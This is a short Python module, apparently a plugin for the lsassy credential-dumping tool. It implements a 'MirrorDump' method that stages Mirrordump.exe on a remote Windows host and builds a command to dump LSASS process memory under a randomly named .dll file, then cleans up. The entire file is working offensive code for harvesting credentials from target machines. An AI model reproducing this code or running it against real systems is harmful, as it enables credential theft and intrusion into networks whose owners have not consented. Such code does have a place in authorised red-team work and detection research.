"""
https://github.com/CCob/MirrorDump
"""

import random
import string

from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.mirrordump = Dependency("mirrordump", "Mirrordump.exe")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.mirrordump])

    def clean(self):
        self.clean_dependencies([self.mirrordump])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{} -f {}{} -d {}""".format(
            self.mirrordump.get_remote_path(),
            self.dump_path, self.dump_name,
            ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll"
        )
        return {
            "cmd": cmd_command,
            "pwsh": cmd_command
        }
